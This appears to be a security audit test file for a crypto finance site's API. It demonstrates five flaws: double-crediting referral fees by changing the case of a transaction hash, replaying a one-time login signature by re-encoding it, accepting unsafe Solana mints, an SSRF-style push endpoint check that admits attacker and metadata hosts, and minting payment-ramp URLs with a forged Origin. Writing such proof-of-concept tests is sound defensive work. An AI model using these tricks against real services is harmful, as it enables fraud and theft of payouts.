import { beforeEach, expect, it } from 'vitest';
import { secp256k1 } from '../../../../../website/node_modules/@noble/curves/secp256k1.js';
import { resetRateLimit } from '../../../../../website/api/_rpcProxy.js';
import { issueSession } from '../../../../../website/api/_swingsAuth.js';
import { handleReferrals } from '../../../../../website/api/_swingsReferrals.js';
import { handleAccount, resetAccountState } from '../../../../../website/api/_swingsAccount.js';
import { DEFAULT_EVM_FEE_ADDRESS } from '../../../../../website/api/_referralVerify.js';
import { keccak256 } from '../../../../../website/src/swings/core/keccak.js';
import { loginMessage } from '../../../../../website/src/swings/account/loginMessage.js';
import { acceptSolanaLaunch } from '../../../../../website/src/swings/launchbox/core.js';
import { validPushEndpoint } from '../../../../../website/src/swings/notify/vapid.js';
import { handleRamp } from '../../../../../website/api/_ramp.js';

const NOW = 1_800_000_000_000;
const KEY = 'service-key-for-tests';
const ORIGIN = 'https://aretiafinance.org';
const TRADER = '0x' + '1'.repeat(40);
const REFERRER = '0x' + '2'.repeat(40);
const USDC = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48';
const pad = (a: string) => '0x' + a.replace('0x', '').padStart(64, '0');
const TRANSFER = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';
const HASH = '0x' + 'ab'.repeat(32);

beforeEach(() => { resetRateLimit(); resetAccountState(); });

function world() {
  const credits: Record<string, unknown>[] = [];
  const bindings: Record<string, unknown>[] = [{ trader: 'evm:' + TRADER, referrer: 'evm:' + REFERRER, bound_at: NOW - 1000, expires_at: NOW + 1e10 }];
  const fetchImpl = (async (input: string | URL, init?: RequestInit) => {
    const url = String(input);
    const ok = (d: unknown, s = 200) => new Response(JSON.stringify(d), { status: s });
    if (url.includes('/rest/v1/')) {
      const [path, query = ''] = url.split('/rest/v1/')[1]!.split('?');
      if (path === 'referral_revocations') return ok([]);
      if (path === 'referral_bindings') return ok(bindings);
      if (init?.method === 'POST') {
        const row = JSON.parse(String(init.body));
        // PostgREST primary key (chain, tx, asset): plain text comparison, as in Postgres.
        const dup = credits.some((r) => r.chain === row.chain && r.tx === row.tx && r.asset === row.asset);
        if (!dup) credits.push(row);
        return ok(dup ? [] : [row], 201);
      }
      return ok(credits.filter((c) => Number(c.created_at) >= NOW - 86_400_000));
    }
    const req = JSON.parse(String(init?.body));
    const reply = (r: unknown) => ok({ jsonrpc: '2.0', id: 1, result: r });
    // A real node decodes the hash as hex, so upper/lower case name the same transaction.
    const known = String(req.params[0]).toLowerCase() === HASH;
    if (req.method === 'eth_getTransactionByHash') return reply(known ? { from: TRADER, to: USDC, value: '0x0' } : null);
    if (req.method === 'eth_getTransactionReceipt') return reply(known ? { status: '0x1', blockNumber: '0x10', logs: [{ address: USDC, topics: [TRANSFER, pad(TRADER), pad(DEFAULT_EVM_FEE_ADDRESS)], data: pad('0x' + (5_800_000).toString(16)) }] } : null);
    if (req.method === 'eth_getBlockByNumber') return reply({ timestamp: '0x' + Math.floor((NOW - 60_000) / 1000).toString(16) });
    return reply(null);
  }) as unknown as typeof fetch;
  return { credits, fetchImpl };
}

function variant(i: number): string {
  // Flip the case of hex letters according to the bits of i.
  let k = 0;
  return '0x' + [...HASH.slice(2)].map((c) => (/[a-f]/.test(c) ? ((i >> k++) & 1 ? c.toUpperCase() : c) : c)).join('');
}

it('F1: one on-chain fee payment is credited several times by changing the hash case', async () => {
  const w = world();
  const token = issueSession(KEY, 'evm:' + TRADER, NOW).token;
  let credited = 0;
  const statuses: string[] = [];
  for (let i = 0; i < 12; i++) {
    const out = await handleReferrals({ method: 'POST', origin: ORIGIN, authorization: 'Bearer ' + token, ip: 'x', body: { op: 'record', chain: 'ethereum', txs: [variant(i)] }, env: { SUPABASE_URL: 'https://db.example.co', SUPABASE_SERVICE_ROLE_KEY: KEY }, fetchImpl: w.fetchImpl, now: NOW });
    const b = JSON.parse(out.body);
    credited += b.credited;
    statuses.push(b.results[0].result);
  }
  console.log('statuses', statuses.join(','), 'credited', credited, 'rows', w.credits.length);
  console.log('owed share sum', w.credits.filter((c) => c.status === 'credited').reduce((a, c) => a + BigInt(c.share_raw as string), 0n), 'of fee 5800000');
  expect(credited).toBeGreaterThan(1);
});

function evmLogin(priv: Uint8Array, nonce: string) {
  const pub = secp256k1.getPublicKey(priv, false).slice(1);
  const address = '0x' + Buffer.from(keccak256(pub).slice(12)).toString('hex');
  const message = loginMessage({ family: 'evm', address, domain: 'aretiafinance.org', issuedAt: NOW, nonce });
  const body = new TextEncoder().encode(message);
  const prefixed = new TextEncoder().encode('\x19Ethereum Signed Message:\n' + body.length);
  const all = new Uint8Array(prefixed.length + body.length); all.set(prefixed); all.set(body, prefixed.length);
  const sig = secp256k1.sign(keccak256(all), priv);
  const hex = sig.toCompactHex() + (27 + sig.recovery).toString(16);
  return { message, hex };
}

it('F-replay: the one-time sign-in check is bypassed by re-encoding the signature', async () => {
  const priv = secp256k1.utils.randomPrivateKey();
  const { message, hex } = evmLogin(priv, 'a'.repeat(32));
  const env = { SUPABASE_URL: 'https://db.example.co', SUPABASE_SERVICE_ROLE_KEY: KEY };
  const call = (signature: string) => handleAccount({ method: 'POST', origin: ORIGIN, authorization: null, ip: 'x', body: { op: 'login', message, signature }, env, fetchImpl: fetch, now: NOW + 1000 });
  const a = await call('0x' + hex);
  const b = await call('0x' + hex); // refused: same encoding
  const c = await call(hex); // no 0x prefix
  const d = await call('0x' + hex.toUpperCase()); // upper case
  console.log('replay statuses', a.status, b.status, c.status, d.status);
  expect([a.status, b.status, c.status, d.status]).toEqual([200, 401, 200, 200]);
});

it('F-launchbox: a Solana mint that keeps its mint and freeze authority is accepted as an Aretia launch', () => {
  const FEE_WALLET = 'Fee1111111111111111111111111111111111111111';
  const PAYER = '7'.repeat(43);
  const MINT = '8'.repeat(43);
  const tx = { meta: { err: null }, blockTime: 1, transaction: { message: { accountKeys: [{ pubkey: PAYER, signer: true }], instructions: [
    { programId: '11111111111111111111111111111111', parsed: { type: 'transfer', info: { source: PAYER, destination: FEE_WALLET, lamports: 0 } } },
  ] } } };
  // Fill the fee amount and programs from the module itself.
  return import('../../../../../website/src/swings/launchbox/core.js').then((m: any) => {
    const lamports = m.SOLANA_FEE_LAMPORTS;
    const T22 = m.TOKEN_2022_PROGRAM ?? 'TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb';
    tx.transaction.message.instructions[0]!.parsed.info.lamports = typeof lamports === 'bigint' ? Number(lamports) : lamports;
    (tx.transaction.message.instructions as any[]).push(
      { programId: '11111111111111111111111111111111', parsed: { type: 'createAccount', info: { owner: T22, newAccount: MINT } } },
      { programId: T22, parsed: { type: 'initializeMint2', info: { mint: MINT, decimals: 6, mintAuthority: PAYER, freezeAuthority: PAYER } } },
    );
    const hit = acceptSolanaLaunch(tx as any, 'sig', FEE_WALLET);
    console.log('launchbox accepted', hit);
    expect(hit?.mint).toBe(MINT);
  });
});

it('F-push: any https host is accepted as a push endpoint', () => {
  for (const u of ['https://attacker.example/x', 'https://169.254.169.254.nip.io/latest', 'https://internal.corp.example/admin']) expect(validPushEndpoint(u)).toBe(true);
});

it('F-ramp: a signed MoonPay URL for any wallet is minted by a scripted request with a forged Origin', async () => {
  const out = await handleRamp({ method: 'POST', origin: ORIGIN, ip: 'x', contentType: 'application/json', body: JSON.stringify({ action: 'session', provider: 'moonpay', side: 'buy', asset: 'USDC', wallet: '0x' + '9'.repeat(40), chain: 'ethereum', amount: 500 }), env: { RAMP_ENABLED: '1', MOONPAY_PUBLISHABLE_KEY: 'pk_live_x', MOONPAY_SECRET_KEY: 'sk_live_y', MOONPAY_ENV: 'production' }, fetchImpl: fetch, now: NOW });
  console.log('ramp', out.status, out.body);
  expect(out.status).toBe(200);
});
